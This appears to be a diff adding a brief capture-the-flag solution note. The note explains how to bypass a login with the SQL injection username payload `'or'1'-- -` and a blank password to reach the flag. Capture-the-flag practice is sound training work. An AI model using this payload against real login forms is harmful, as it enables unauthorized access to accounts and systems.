@@ -1,0 +1,7 @@
+You don't need the password. You don't even need the username. 
+
+SQLI
+Username: 'or'1'-- -
+Password: blank
+
+Flag is found after entering the sqli command
